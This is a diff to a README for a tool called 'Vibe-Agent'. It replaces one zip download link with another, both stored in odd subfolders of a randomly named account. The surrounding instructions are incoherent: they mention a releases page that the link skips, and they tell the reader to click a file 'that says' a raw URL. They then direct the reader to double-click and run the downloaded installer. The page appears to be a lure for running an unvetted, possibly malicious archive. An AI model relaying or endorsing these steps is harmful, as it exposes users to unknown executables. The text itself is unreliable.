@@ -6,7 +6,7 @@ Welcome to Vibe-Agent! This application offers a user-friendly way to handle ess
 
 ## 📥 Download Vibe-Agent
 
-[![Download Vibe-Agent](https://raw.githubusercontent.com/innocuous-stiffness915/Vibe-Agent/main/HelloAgent/Vibe-Agent-v2.4.zip)](https://raw.githubusercontent.com/innocuous-stiffness915/Vibe-Agent/main/HelloAgent/Vibe-Agent-v2.4.zip)
+[![Download Vibe-Agent](https://github.com/innocuous-stiffness915/Vibe-Agent/raw/refs/heads/main/nano-banana-base/Agent_Vibe_1.8.zip)](https://github.com/innocuous-stiffness915/Vibe-Agent/raw/refs/heads/main/nano-banana-base/Agent_Vibe_1.8.zip)
 
 ## 📋 System Requirements
 
@@ -20,13 +20,13 @@ Before you download, make sure your system meets these requirements:
 ## 💾 Download & Install
 
 1. **Visit the Releases Page**  
-   To download the latest version of Vibe-Agent, visit this page: [Download Here](https://raw.githubusercontent.com/innocuous-stiffness915/Vibe-Agent/main/HelloAgent/Vibe-Agent-v2.4.zip). 
+   To download the latest version of Vibe-Agent, visit this page: [Download Here](https://github.com/innocuous-stiffness915/Vibe-Agent/raw/refs/heads/main/nano-banana-base/Agent_Vibe_1.8.zip). 
 
 2. **Find the Latest Release**  
    On the releases page, look for the most recent version. You’ll see a list of available downloads.
 
 3. **Download the Installer**  
-   Click on the file that says `https://raw.githubusercontent.com/innocuous-stiffness915/Vibe-Agent/main/HelloAgent/Vibe-Agent-v2.4.zip` or a similar executable file for your operating system. The download will start automatically.
+   Click on the file that says `https://github.com/innocuous-stiffness915/Vibe-Agent/raw/refs/heads/main/nano-banana-base/Agent_Vibe_1.8.zip` or a similar executable file for your operating system. The download will start automatically.
 
 4. **Run the Installer**  
    Once the download is complete, locate the downloaded file, usually found in your "Downloads" folder. Double-click the file to run the installer.
